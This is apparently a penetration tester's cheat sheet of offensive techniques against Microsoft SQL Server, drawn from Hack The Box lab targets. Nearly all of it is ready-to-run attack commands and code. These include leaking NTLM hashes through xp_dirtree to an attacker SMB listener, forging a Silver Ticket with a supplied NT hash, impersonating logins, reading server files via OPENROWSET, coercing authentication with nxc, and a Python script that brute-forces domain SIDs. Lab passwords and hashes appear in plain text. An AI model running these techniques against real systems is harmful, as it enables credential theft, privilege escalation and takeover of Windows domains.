# Ms-sql

## connect

```bash
mssqlclient.py admin:this_is_password@10.10.10.52 -db orcharddb -dc-ip 10.10.10.52
```

if not working try with windows auth

```bash
mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb
```

## Getting Hash by xp_dirtree

```
xp_dirtree \\192.168.1.210\shared
```

while listening on the other side with smb server or responder.

## Getting SIDs

```
SQL (scott  guest@master)> SELECT CONVERT(VARCHAR(100), SUSER_SID('SIGNED\Domain Users'), 1) AS DomainUsersSID;
```

## Enum users for database

```
SELECT * FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE'
```

## List users

```
SELECT sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```

# Service Account & SPN Enumeration

## Get SID of a user or a group

```
    SELECT SUSER_SID('EIGHTEEN\IT');
```

## Get User or a group using sid

```
SELECT SUSER_SNAME(0x010500000000000515000000BBAA5F35D78B6B2C9F2F2B4F04000000);
```

## Get service account information:

```
-- Check service account (crucial for Silver Ticket)
SELECT SERVICEACCOUNT FROM sys.dm_server_services WHERE servicename LIKE '%SQL Server%';

-- Alternative methods
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER', 'ObjectName';
```

## Using Sliver Ticket to get dbo

```
ticketer.py -spn MSSQLSvc/dc.signed.htb:1433 -nthash ef699384c3285c54128a3ee1ddb1a0cc -user-id 1103 -group 1105 -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb mssqlsvc
```

## Note: If you get access with the silver ticket for exmaple you can add the 500 group which is the Admins group, then the service will work with the administrator privilage but this will not work with xp_cmdshell as this will run with the logon user access, you can use select to read data like...

```
SELECT * FROM OPENROWSET(BULK N'C:\Path\To\Your\FileName.txt', SINGLE_CLOB) AS FileContents;
```

## Impersonation

```
nxc mssql 10.10.11.95 -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth -M mssql_priv
```

Then

```
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev';
SQL (appdev  appdev@master)> SELECT SYSTEM_USER;
```

## Enum users and groups with sid reverse enum

```
U can use nxc mssql bruterid
```

```python
#!/usr/bin/env python3

import pymssql
import sys
import struct

def mssql_sid_lookup(server, username, password, sid_hex):
    """Login to MSSQL and lookup SID using SUSER_SNAME"""

    try:
        # Connect to database
        conn = pymssql.connect(server=server, user=username, password=password, database='master')
        cursor = conn.cursor()

        # Execute SUSER_SNAME query
        query = f"SELECT SUSER_SNAME({sid_hex})"
        cursor.execute(query)

        # Get result
        result = cursor.fetchone()

        if result and result[0]:
            print(f"[+] SID {sid_hex} belongs to: {result[0]}")
        else:
            print(f"[-] No user found for SID: {sid_hex}")

        # Close connection
        cursor.close()
        conn.close()

    except Exception as e:
        print(f"[-] Error: {e}")

def sid_to_hex(sid_string):
    """Convert SID string to hexadecimal format"""

    # Parse SID string
    parts = sid_string.split('-')

    # Validate SID format
    if not sid_string.startswith('S-') or len(parts) < 3:
        raise ValueError("Invalid SID format")

    revision = int(parts[1])
    identifier_authority = int(parts[2])
    sub_authorities = [int(auth) for auth in parts[3:]]
    sub_authority_count = len(sub_authorities)

    # Build bytes
    sid_bytes = bytearray()

    # Revision (1 byte)
    sid_bytes.append(revision)

    # Sub-authority count (1 byte)
    sid_bytes.append(sub_authority_count)

    # Identifier authority (6 bytes, big-endian)
    sid_bytes.extend(identifier_authority.to_bytes(6, byteorder='big'))

    # Sub-authorities (4 bytes each, little-endian)
    for sub_auth in sub_authorities:
        sid_bytes.extend(struct.pack('<I', sub_auth))

    # Convert to hex
    hex_sid = '0x' + sid_bytes.hex().upper()

    return hex_sid


def main():
    if len(sys.argv) != 4:
        print("Usage: python mssql_sid_lookup.py <server> <username> <password>")
        print("Example: python mssql_sid_lookup.py 10.10.11.95 kevin 'iNa2we6haRj2gaw!'")
        sys.exit(1)

    server = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]


    for i in range(1601, 1700):
        sid_hex = "S-1-5-21-1152179935-589108180-1989892463-" + str(i)

        mssql_sid_lookup(server, username, password, sid_to_hex(sid_hex))




if __name__ == "__main__":
    main()

```

## No Login

if you can't access the mssql for some reason but u still have a user that can access the service then u can you use this to get a hit on responder.

```bash
nxc mssql manager.htb -u operator -p operator -M mssql_coerce -o LISTENER=10.10.11.236
```
